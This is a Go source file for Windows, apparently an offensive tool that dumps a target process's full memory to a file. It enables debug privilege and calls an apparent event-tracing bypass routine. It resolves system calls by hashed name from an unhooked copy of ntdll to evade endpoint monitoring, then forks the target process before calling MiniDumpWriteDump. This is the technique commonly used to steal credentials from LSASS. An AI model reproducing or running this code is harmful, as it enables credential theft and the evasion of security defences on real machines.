package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/binary"
	"fmt"
	"github.com/castaneai/hinako"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	wins "github.com/cloudfoundry/gosigar/sys/windows"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
)

var (
	arch          *hinako.ArchAMD64
	err           error
	ReMapNtdll, _ = gabh.ReMapNtdll()
)

func ZwOpenP(ZwOpenProcess uintptr, pid uintptr) (uintptr, uintptr, uintptr, error) {
	type objectAttrs struct {
		Length                   uintptr
		RootDirectory            uintptr
		ObjectName               uintptr
		Attributes               uintptr
		SecurityDescriptor       uintptr
		SecurityQualityOfService uintptr
	}

	type clientID struct {
		UniqueProcess uintptr
		UniqueThread  uintptr
	}

	var pHndl uintptr
	r1, r2, lastErr := syscall.Syscall6(ZwOpenProcess, 4,
		uintptr(unsafe.Pointer(&pHndl)),
		windows.PROCESS_CREATE_PROCESS, //0x1fffff,				//ProcessAllAccess = 0x1fffff
		uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
		uintptr(unsafe.Pointer(&clientID{uintptr(pid), 0})),
		0,
		0,
	)
	return pHndl, r1, r2, lastErr
}

func enableSeDebugPrivilege() error {
	self, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}

	var token syscall.Token
	err = syscall.OpenProcessToken(self, syscall.TOKEN_QUERY|syscall.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		return err
	}

	if err = wins.EnableTokenPrivileges(token, wins.SeDebugPrivilege); err != nil {
		return err
	}

	return nil
}

func main() {

	pid, _ := strconv.Atoi(os.Args[1])

	e := enableSeDebugPrivilege()
	if e != nil {
		fmt.Printf("SeDebugPrivilege failed: %v\n", e)
		return
	}
	ByETW()

	//===============================================
	//
	//		Hook API
	//
	//===============================================

	NtQuerySystemInformation, _, e := ReMapNtdll.GetFuncUnhook("ff06d2a62a1b4f33ab91d501ad53158cf899f780", str2sha1)
	if e != nil {
		panic(e)
	}

	// API Hooking by hinako
	//var original *syscall.Proc
	var hook2 *hinako.Hook
	hook2, err = hinako.NewHookByName(arch, "ntdll.dll", "NtQuerySystemInformation", func(n1, n2, n3, n4 uintptr) uintptr {
		fmt.Println("---------------------------------------------------")
		fmt.Println("NtQuerySystemInformation hooked !!!!!")

		windows.SleepEx(1, false)

		r, _, _ := syscall.Syscall6(uintptr(NtQuerySystemInformation), 4, n1, n2, n3, n4, 0, 0)
		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)

		fmt.Println("---------------------------------------------------")
		fmt.Println("")

		return uintptr(r)
	})
	if err != nil {
		log.Fatalf("failed to hook NtQuerySystemInformation: %+v", err)
	}
	defer hook2.Close()
	//original = hook1.OriginalProc
	// After hook

	//===============================================
	//
	//		Hook End
	//
	//===============================================

	//Read and Fork

	var hProcess uintptr
	ZwOpenProcess, _, e := ReMapNtdll.GetFuncUnhook("4722e0577c85ecb9c134ffbb2ce080fee0ba5d64", str2sha1)
	if e != nil {
		panic(e)
	}

	ZwClose, _, e := ReMapNtdll.GetFuncUnhook("27dffd1dd7df9bcfcdcf0513700515a7f6eeb766", str2sha1)
	if e != nil {
		panic(e)
	}

	hProcess, _, _, _ = ZwOpenP(uintptr(ZwOpenProcess), uintptr(pid))

	NtCreateProcessEx, _, e := ReMapNtdll.GetFuncUnhook("df1a83db80c83f59a3b2c0337d704fe579401473", str2sha1)
	if e != nil {
		panic(e)
	}

	var currentSnapshotProcess uintptr

	//syscall.Syscall9(uintptr(NtCreateProcessEx),9,uintptr(unsafe.Pointer(&currentSnapshotProcess)),0x1fffff,0,hProcess,0,0,0,0,0)
	syscall.Syscall9(uintptr(NtCreateProcessEx), 9, uintptr(unsafe.Pointer(&currentSnapshotProcess)), windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, 0, hProcess, 0, 0, 0, 0, 0)

	//Read and Fork End

	dump, _ := minidump(uint32(pid), windows.Handle(currentSnapshotProcess))

	if dump != nil {
		ioutil.WriteFile("dumpfile.dmp", dump, 0644)
	}

	syscall.Syscall(uintptr(ZwClose), 1, currentSnapshotProcess, 0, 0)
	syscall.Syscall(uintptr(ZwClose), 1, hProcess, 0, 0)

}

type outDump struct {
	outPtr uintptr
}

type ProcessMemoryCounters struct {
	Cb                         uint32
	PageFaultCount             uint32
	PeakWorkingSetSize         int
	WorkingSetSize             int
	QuotaPeakPagedPoolUsage    int
	QuotaPagedPoolUsage        int
	QuotaPeakNonPagedPoolUsage int
	QuotaNonPagedPoolUsage     int
	PagefileUsage              int
	PeakPagefileUsage          int
}

type MiniDumpCallbackInformation struct {
	CallbackRoutine uintptr
	CallbackParam   uintptr
}

func minidump(pid uint32, proc windows.Handle) ([]byte, error) {
	GetProcessHeap := syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcessHeap")

	heapHandle, _, err0 := syscall.Syscall(uintptr(GetProcessHeap.Addr()), 0, 0, 0, 0)
	if heapHandle == 0 {
		return nil, err0
	}

	procMemCounters := ProcessMemoryCounters{}
	sizeOfMemCounters := uint32(unsafe.Sizeof(procMemCounters))

	GetProcessMemoryInfo, _, _ := gabh.GetFuncPtr("psapi.dll", "730673ace5e3cc0e4be126de2ec956c68a9d03d4", str2sha1)
	r, _, _ := syscall.Syscall(uintptr(GetProcessMemoryInfo), 3, uintptr(proc), uintptr(unsafe.Pointer(&procMemCounters)), uintptr(sizeOfMemCounters))
	if r == 0 {
		// {{if .Config.Debug}}
		log.Printf("GetProcessMemoryInfo failed: %s\n", err)
		// {{end}}
		return nil, err
	}

	heapSize := procMemCounters.WorkingSetSize + IncrementSize

	HeapAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapAlloc")

	dumpBuffer, _, _ := syscall.Syscall(HeapAlloc.Addr(), 3, uintptr(heapHandle), uintptr(0x00000008), uintptr(heapSize))

	outData := outDump{
		outPtr: dumpBuffer,
	}

	callbackInfo := MiniDumpCallbackInformation{
		CallbackRoutine: windows.NewCallback(minidumpCallback),
		CallbackParam:   uintptr(unsafe.Pointer(&outData)),
	}
	MiniDumpWriteDump, _, e := gabh.GetFuncPtr("dbgcore.dll", "6fd11841d7f7c5514490f6079ab1c51c3162c477", str2sha1)

	if e != nil {
		panic(e)
	}

	Success, _, err := syscall.Syscall9(uintptr(MiniDumpWriteDump), 7,
		uintptr(proc),
		uintptr(pid),
		0,
		MiniDumpWithFullMemory,
		0, 0,
		uintptr(unsafe.Pointer(&callbackInfo)),
		0, 0)

	if Success == 0 {
		fmt.Println("Failed")
		return nil, err
	}
	fmt.Println("Dump Succeed")

	outBuff := make([]byte, bytesRead)
	outBuffAddr := uintptr(unsafe.Pointer(&outBuff[0]))

	RtlCopyMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("RtlCopyMemory")

	syscall.Syscall(uintptr(RtlCopyMemory.Addr()), 3, outBuffAddr, outData.outPtr, uintptr(bytesRead))

	HeapFree := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapFree")

	syscall.Syscall(HeapFree.Addr(), 3, heapHandle, 0, outData.outPtr)

	return outBuff, nil

}

type MiniDumpCallbackOutput struct {
	Status int32
}

type MiniDumpCallbackInput struct {
	ProcessId     uint32
	ProcessHandle uintptr
	CallbackType  uint32
	Io            MiniDumpIOCallback
}

type MiniDumpIOCallback struct {
	Handle      uintptr
	Offset      uint64
	Buffer      uintptr
	BufferBytes uint32
}

func getCallbackInput(callbackInputPtr uintptr) (*MiniDumpCallbackInput, error) {
	callbackInput := MiniDumpCallbackInput{}
	ioCallback := MiniDumpIOCallback{}
	bufferSize := unsafe.Sizeof(callbackInput)
	data := make([]byte, bufferSize)
	dataPtr := uintptr(unsafe.Pointer(&data[0]))

	RtlCopyMemory, _, _ := gabh.GetFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)

	syscall.Syscall(uintptr(RtlCopyMemory), 3, dataPtr, callbackInputPtr, uintptr(bufferSize))
	buffReader := bytes.NewReader(data)
	err := binary.Read(buffReader, binary.LittleEndian, &callbackInput.ProcessId)
	if err != nil {
		return nil, err
	}
	var procHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &procHandle)
	if err != nil {
		return nil, err
	}
	callbackInput.ProcessHandle = uintptr(procHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &callbackInput.CallbackType)
	if err != nil {
		return nil, err
	}
	var ioHandle uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioHandle)
	if err != nil {
		return nil, err
	}
	ioCallback.Handle = uintptr(ioHandle)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.Offset)
	if err != nil {
		return nil, err
	}
	var ioBuffer uint64
	err = binary.Read(buffReader, binary.LittleEndian, &ioBuffer)
	if err != nil {
		return nil, err
	}
	ioCallback.Buffer = uintptr(ioBuffer)
	err = binary.Read(buffReader, binary.LittleEndian, &ioCallback.BufferBytes)
	if err != nil {
		return nil, err
	}
	callbackInput.Io = ioCallback
	return &callbackInput, nil
}

const (
	ModuleCallback = iota
	ThreadCallback
	ThreadExCallback
	IncludeThreadCallback
	IncludeModuleCallback
	MemoryCallback
	CancelCallback
	WriteKernelMinidumpCallback
	KernelMinidumpStatusCallback
	RemoveMemoryCallback
	IncludeVmRegionCallback
	IoStartCallback
	IoWriteAllCallback
	IoFinishCallback
	ReadMemoryFailureCallback
	SecondaryFlagsCallback
	IsProcessSnapshotCallback
	VmStartCallback
	VmQueryCallback
	VmPreReadCallback
	VmPostReadCallback

	S_FALSE                     = 1
	S_OK                        = 0
	TRUE                        = 1
	FALSE                       = 0
	IncrementSize               = 5 * 1024 * 1024
	MiniDumpWithFullMemory      = 0x00000002
	MiniDumpWithFullMemoryInfo  = 0x00000800
	MiniDumpWithUnloadedModules = 0x00000020
)

var bytesRead uint32 = 0

func minidumpCallback(callbackParam uintptr, callbackInputPtr uintptr, callbackOutput *MiniDumpCallbackOutput) uintptr {
	callbackInput, err := getCallbackInput(callbackInputPtr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("getCallbackInput failed: %s\n", err.Error())
		// {{end}}
		return FALSE
	}
	switch callbackInput.CallbackType {
	case IoStartCallback:
		callbackOutput.Status = S_FALSE
	case IoWriteAllCallback:
		callbackOutput.Status = S_OK
		outData := (*outDump)(unsafe.Pointer(callbackParam))
		GetProcessHeap := syscall.NewLazyDLL("kernel32.dll").NewProc("GetProcessHeap")

		procHeap, _, err := syscall.Syscall(uintptr(GetProcessHeap.Addr()), 0, 0, 0, 0)
		if procHeap == 0 {
			log.Printf("minidumpCallback GetProcessHeap failed: %s\n", err.Error())
			// {{end}}
			return FALSE
		}
		HeapSize := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapSize")

		currentBuffSize, _, err := syscall.Syscall(uintptr(HeapSize.Addr()), 3, procHeap, 0, outData.outPtr)
		if currentBuffSize == 0 {
			// {{if .Config.Debug}}
			log.Printf("minidumpCallback HeapSize failed: %s\n", err.Error())
			// {{end}}
			return FALSE
		}
		bytesAndOffset := callbackInput.Io.Offset + uint64(callbackInput.Io.BufferBytes)
		if bytesAndOffset >= uint64(currentBuffSize) {
			increasedSize := IncrementSize
			if bytesAndOffset <= uint64(currentBuffSize*2) {
				increasedSize = int(currentBuffSize) * 2
			} else {
				increasedSize += int(bytesAndOffset)
			}
			HeapReAlloc := syscall.NewLazyDLL("kernel32.dll").NewProc("HeapReAlloc")

			outData.outPtr, _, err = syscall.Syscall6(uintptr(HeapReAlloc.Addr()), 4, procHeap, 0, outData.outPtr, uintptr(increasedSize), 0, 0)
			if outData.outPtr == 0 {
				// {{if .Config.Debug}}
				log.Printf("minidumpCallback HeapReAlloc failed: %s\n", err.Error())
				// {{end}}
				return FALSE
			}
		}
		destination := outData.outPtr + uintptr(callbackInput.Io.Offset)

		RtlCopyMemory, _, _ := gabh.GetFuncPtr("kernel32.dll", "638f1a50566e7a2aceaeeebc63980672611c32a0", str2sha1)

		syscall.Syscall(uintptr(RtlCopyMemory), 3, destination, callbackInput.Io.Buffer, uintptr(callbackInput.Io.BufferBytes))

		bytesRead += callbackInput.Io.BufferBytes
	case IoFinishCallback:
		callbackOutput.Status = S_OK
	default:
		return TRUE
	}
	return TRUE
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
